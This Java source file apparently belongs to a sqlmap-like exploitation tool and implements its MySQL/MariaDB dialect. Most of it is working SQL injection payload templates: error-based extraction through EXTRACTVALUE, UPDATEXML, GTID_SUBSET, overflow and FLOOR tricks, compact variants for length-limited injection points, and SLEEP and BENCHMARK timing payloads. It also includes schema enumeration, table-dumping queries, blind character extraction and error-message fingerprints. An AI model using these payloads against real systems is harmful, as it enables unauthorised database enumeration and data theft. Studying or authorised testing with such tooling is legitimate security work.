package com.omnistrike.modules.exploit.omnimap.dbms;

import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.ThreadLocalRandom;
import java.util.regex.Pattern;
import java.util.stream.Collectors;

/**
 * MySQL / MariaDB dialect for OmniMap.
 * Uses information_schema, MID(), CHAR(), SLEEP(), IF(), extractvalue/updatexml for errors.
 */
public class MysqlDialect implements DbmsDialect {

    /**
     * Random hex markers for error-based extraction (like sqlmap's kb.chars.start/stop).
     * sqlmap generates random 4-byte hex strings like 0x716b7871 and 0x7170787871.
     * These are unique per session to avoid false positives.
     */
    private final String errorHexPrefix;
    private final String errorHexSuffix;
    /** Decoded string forms for regex matching in error-based extraction */
    private final String errorPrefixDecoded;
    private final String errorSuffixDecoded;
    /** Random numbers for error function arguments (like sqlmap's [RANDNUM]) */
    private final int errorRandNum;
    private final int errorRandNum2;

    public MysqlDialect() {
        this.errorHexPrefix = randomHex(4);
        this.errorHexSuffix = randomHex(5);
        this.errorPrefixDecoded = decodeHex(errorHexPrefix);
        this.errorSuffixDecoded = decodeHex(errorHexSuffix);
        this.errorRandNum = ThreadLocalRandom.current().nextInt(1000, 10000);
        this.errorRandNum2 = ThreadLocalRandom.current().nextInt(1000, 10000);
    }

    public String getErrorPrefixDecoded() { return errorPrefixDecoded; }
    public String getErrorSuffixDecoded() { return errorSuffixDecoded; }

    private static String randomHex(int byteCount) {
        StringBuilder sb = new StringBuilder("0x");
        ThreadLocalRandom rng = ThreadLocalRandom.current();
        for (int i = 0; i < byteCount; i++) {
            // sqlmap uses printable chars (0x71-0x78 range), we do the same
            sb.append(String.format("%02x", rng.nextInt(0x71, 0x79)));
        }
        return sb.toString();
    }

    private static String decodeHex(String hex) {
        String raw = hex.startsWith("0x") ? hex.substring(2) : hex;
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < raw.length(); i += 2) {
            sb.append((char) Integer.parseInt(raw.substring(i, i + 2), 16));
        }
        return sb.toString();
    }

    @Override
    public String getName() { return "MySQL"; }

    @Override
    public String currentDatabase() {
        return "SELECT database()";
    }

    @Override
    public String errorTestQuery() {
        // MySQL's database() can return NULL if no default DB is selected.
        // IFNULL wraps it to guarantee a non-null return for error-based detection.
        // Also use CHAR(49) (='1') as fallback to avoid CONCAT returning NULL.
        return "SELECT IFNULL(database(),CHAR(49))";
    }

    @Override
    public String listDatabases() {
        return "SELECT schema_name FROM information_schema.schemata";
    }

    @Override
    public String listTables(String database) {
        return "SELECT table_name FROM information_schema.tables WHERE table_schema='" + database + "'";
    }

    @Override
    public String listColumns(String database, String table) {
        return "SELECT column_name FROM information_schema.columns WHERE table_schema='" + database
                + "' AND table_name='" + table + "'";
    }

    @Override
    public String dumpData(String database, String table, List<String> columns, int offset, int limit) {
        String cols = columns.stream()
                .map(c -> "IFNULL(CAST(`" + c + "` AS CHAR),0x20)")
                .collect(Collectors.joining(",0x7c,"));
        return "SELECT CONCAT(" + cols + ") FROM `" + database + "`.`" + table
                + "` LIMIT " + limit + " OFFSET " + offset;
    }

    @Override
    public String charFunction(int ascii) {
        return "CHAR(" + ascii + ")";
    }

    @Override
    public String substringFunction(String expr, int pos, int len) {
        return "MID((" + expr + ")," + pos + "," + len + ")";
    }

    @Override
    public String lengthFunction(String expr) {
        return "LENGTH((" + expr + "))";
    }

    @Override
    public String sleepFunction(int seconds) {
        return "SLEEP(" + seconds + ")";
    }

    @Override
    public String ifFunction(String condition, String trueVal, String falseVal) {
        return "IF(" + condition + "," + trueVal + "," + falseVal + ")";
    }

    @Override
    public String commentSuffix() {
        return "-- -";
    }

    @Override
    public String concatenate(String... parts) {
        return "CONCAT(" + String.join(",", parts) + ")";
    }

    @Override
    public List<String> errorFunctions() {
        // Ordered by sqlmap level with compact (marker-less) variants interleaved.
        // Compact variants use 0x7e (~) as a single delimiter instead of random hex markers.
        // They produce much shorter payloads (~40 chars vs ~120) for character-limited injection
        // points like cookies, headers, and truncating queries.
        // Data extracted via existing XPATH/GTID patterns — extractFromXpathError() strips
        // the leading ~ automatically.
        return List.of(
                // Level 1 (#1): EXTRACTVALUE with markers — best for reliable extraction
                "EXTRACTVALUE(" + errorRandNum + ",CONCAT(0x5c," + errorHexPrefix + ",(%s)," + errorHexSuffix + "))",
                // Level 1: EXTRACTVALUE compact — for character-limited injection points
                "EXTRACTVALUE(" + errorRandNum + ",CONCAT(0x7e,(%s)))",
                // Level 2 (#3): GTID_SUBSET with markers (MySQL 5.6+)
                "GTID_SUBSET(CONCAT(" + errorHexPrefix + ",(%s)," + errorHexSuffix + ")," + errorRandNum + ")",
                // Level 2: GTID_SUBSET compact — shorter payload, no character limit on output
                "GTID_SUBSET(CONCAT(0x7e,(%s))," + errorRandNum + ")",
                // Level 3 (#14): UPDATEXML with markers
                "UPDATEXML(" + errorRandNum + ",CONCAT(0x2e," + errorHexPrefix + ",(%s)," + errorHexSuffix + ")," + errorRandNum2 + ")",
                // Level 4 (#5): BIGINT UNSIGNED overflow
                "(SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(" + errorHexPrefix + ",(%s)," + errorHexSuffix + ",0x78))s),8446744073709551610,8446744073709551610)))",
                // Level 4 (#7): EXP overflow
                "EXP(~(SELECT * FROM (SELECT CONCAT(" + errorHexPrefix + ",(%s)," + errorHexSuffix + ",0x78))x))",
                // Level 4 (#11): FLOOR double query — INFORMATION_SCHEMA.PLUGINS
                "(SELECT " + errorRandNum + " FROM(SELECT COUNT(*),CONCAT(" + errorHexPrefix + ",(%s)," + errorHexSuffix + ",FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)",
                // Level 5 (#9): JSON_KEYS (MySQL 5.7.8+)
                "JSON_KEYS((SELECT CONVERT((SELECT CONCAT(" + errorHexPrefix + ",(%s)," + errorHexSuffix + ")) USING utf8)))"
        );
    }

    @Override
    public List<String> errorFunctionsForLevel(int level) {
        List<String> all = errorFunctions();
        // sqlmap gating with compact variants at each level:
        // L1: EXTRACTVALUE (marker + compact) = indices 0,1
        // L2: +GTID (marker + compact) = indices 0-3
        // L3: +UPDATEXML = indices 0-4
        // L4: +BIGINT/EXP/FLOOR = indices 0-7
        // L5: +JSON_KEYS = all 9
        if (level >= 5) return all;                  // all 9
        if (level >= 4) return all.subList(0, 8);    // up to FLOOR
        if (level >= 3) return all.subList(0, 5);    // up to UPDATEXML
        if (level >= 2) return all.subList(0, 4);    // EXTRACTVALUE + GTID (marker + compact)
        return all.subList(0, 2);                    // EXTRACTVALUE marker + compact
    }

    @Override
    public String heavyQuery(int seconds) {
        // sqlmap format: BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]'))
        // Uses hex-encoded random string like sqlmap
        return "BENCHMARK(" + seconds + "000000,MD5(" + errorHexPrefix + "))";
    }

    /** Pre-compiled error patterns — sqlmap errors.xml + ORM/framework patterns */
    private static final List<Pattern> ERROR_PATTERNS = List.of(
            // === sqlmap core patterns (errors.xml) ===
            Pattern.compile("SQL syntax.*?MySQL", Pattern.CASE_INSENSITIVE),
            Pattern.compile("Warning.*?\\Wmysqli?_", Pattern.CASE_INSENSITIVE),
            Pattern.compile("MySQLSyntaxErrorException", Pattern.CASE_INSENSITIVE),
            Pattern.compile("valid MySQL result", Pattern.CASE_INSENSITIVE),
            Pattern.compile("check the manual that (corresponds to|fits) your (MySQL|MariaDB) server version", Pattern.CASE_INSENSITIVE),
            Pattern.compile("Unknown column '[^']+' in", Pattern.CASE_INSENSITIVE),
            Pattern.compile("MySqlClient\\.", Pattern.CASE_INSENSITIVE),
            Pattern.compile("com\\.mysql\\.jdbc", Pattern.CASE_INSENSITIVE),
            Pattern.compile("com\\.mysql\\.cj\\.jdbc", Pattern.CASE_INSENSITIVE),
            Pattern.compile("Zend_Db_(Adapter|Statement)_Mysqli_Exception", Pattern.CASE_INSENSITIVE),
            Pattern.compile("Pdo[./_\\\\]Mysql", Pattern.CASE_INSENSITIVE),
            Pattern.compile("MySqlException", Pattern.CASE_INSENSITIVE),
            // === Native MySQL/MariaDB errors ===
            Pattern.compile("mysql_fetch_(array|assoc|row|object)\\(", Pattern.CASE_INSENSITIVE),
            Pattern.compile("mysql_(num_rows|query|result)\\(", Pattern.CASE_INSENSITIVE),
            Pattern.compile("mysqli_.*?\\(.*?error", Pattern.CASE_INSENSITIVE),
            Pattern.compile("Table '.*?' doesn't exist", Pattern.CASE_INSENSITIVE),
            Pattern.compile("Duplicate entry '.*?' for key", Pattern.CASE_INSENSITIVE),
            Pattern.compile("Data truncated for column", Pattern.CASE_INSENSITIVE),
            Pattern.compile("Column count doesn't match value count", Pattern.CASE_INSENSITIVE),
            Pattern.compile("Incorrect .*? value: '.*?' for column", Pattern.CASE_INSENSITIVE),
            Pattern.compile("Field '.*?' doesn't have a default value", Pattern.CASE_INSENSITIVE),
            Pattern.compile("Access denied for user '.*?'@", Pattern.CASE_INSENSITIVE),
            Pattern.compile("Can't connect to MySQL server", Pattern.CASE_INSENSITIVE),
            Pattern.compile("Lost connection to MySQL server", Pattern.CASE_INSENSITIVE),
            Pattern.compile("Deadlock found when trying to get lock", Pattern.CASE_INSENSITIVE),
            Pattern.compile("Lock wait timeout exceeded", Pattern.CASE_INSENSITIVE),
            Pattern.compile("XPATH syntax error:", Pattern.CASE_INSENSITIVE),
            Pattern.compile("Malformed GTID set specification", Pattern.CASE_INSENSITIVE),
            Pattern.compile("BIGINT UNSIGNED value is out of range", Pattern.CASE_INSENSITIVE),
            Pattern.compile("DOUBLE value is out of range", Pattern.CASE_INSENSITIVE),
            Pattern.compile("Illegal mix of collations", Pattern.CASE_INSENSITIVE),
            Pattern.compile("Subquery returns more than 1 row", Pattern.CASE_INSENSITIVE),
            Pattern.compile("Result consisted of more than one row", Pattern.CASE_INSENSITIVE),
            Pattern.compile("Operand should contain \\d+ column", Pattern.CASE_INSENSITIVE),
            Pattern.compile("ER_PARSE_ERROR", Pattern.CASE_INSENSITIVE),
            Pattern.compile("ER_BAD_FIELD_ERROR", Pattern.CASE_INSENSITIVE),
            Pattern.compile("ER_NO_SUCH_TABLE", Pattern.CASE_INSENSITIVE),
            Pattern.compile("ER_DUP_ENTRY", Pattern.CASE_INSENSITIVE),
            // === SQLSTATE codes with MySQL context ===
            Pattern.compile("SQLSTATE\\[42000\\].*?syntax error", Pattern.CASE_INSENSITIVE),
            Pattern.compile("SQLSTATE\\[HY000\\].*?General error", Pattern.CASE_INSENSITIVE),
            Pattern.compile("SQLSTATE\\[23000\\].*?Integrity constraint", Pattern.CASE_INSENSITIVE),
            // === ORM / framework patterns ===
            Pattern.compile("PDO::.*?SQLSTATE.*?mysql", Pattern.CASE_INSENSITIVE),
            Pattern.compile("wordpress database error", Pattern.CASE_INSENSITIVE),
            Pattern.compile("DBD::mysql", Pattern.CASE_INSENSITIVE),
            Pattern.compile("ActiveRecord::StatementInvalid.*?Mysql", Pattern.CASE_INSENSITIVE),
            Pattern.compile("Sequel::DatabaseError.*?mysql", Pattern.CASE_INSENSITIVE),
            Pattern.compile("django\\.db\\.utils\\.OperationalError.*?mysql", Pattern.CASE_INSENSITIVE),
            Pattern.compile("knex.*?error.*?mysql", Pattern.CASE_INSENSITIVE),
            Pattern.compile("SequelizeDatabaseError.*?mysql", Pattern.CASE_INSENSITIVE),
            Pattern.compile("TypeORMError.*?mysql", Pattern.CASE_INSENSITIVE),
            Pattern.compile("prisma.*?error.*?mysql", Pattern.CASE_INSENSITIVE),
            Pattern.compile("Doctrine\\\\DBAL\\\\Exception.*?mysql", Pattern.CASE_INSENSITIVE),
            Pattern.compile("Illuminate\\\\Database\\\\QueryException.*?mysql", Pattern.CASE_INSENSITIVE),
            Pattern.compile("org\\.hibernate\\.exception\\.SQLGrammarException.*?mysql", Pattern.CASE_INSENSITIVE),
            Pattern.compile("org\\.jooq\\.exception\\.DataAccessException.*?mysql", Pattern.CASE_INSENSITIVE),
            Pattern.compile("sqlalchemy\\.exc\\.OperationalError.*?mysql", Pattern.CASE_INSENSITIVE),
            Pattern.compile("peewee\\.OperationalError.*?mysql", Pattern.CASE_INSENSITIVE),
            Pattern.compile("slick\\.jdbc\\.JdbcBackend.*?mysql", Pattern.CASE_INSENSITIVE)
    );

    @Override
    public List<Pattern> errorPatterns() {
        return ERROR_PATTERNS;
    }

    @Override
    public String asciiAtPosition(String expr, int pos) {
        // sqlmap uses ORD() for MySQL, not ASCII(). ORD() handles multi-byte chars.
        return "ORD(" + substringFunction(expr, pos, 1) + ")";
    }

    @Override
    public String countRows(String database, String table) {
        return "SELECT COUNT(*) FROM `" + database + "`.`" + table + "`";
    }
}
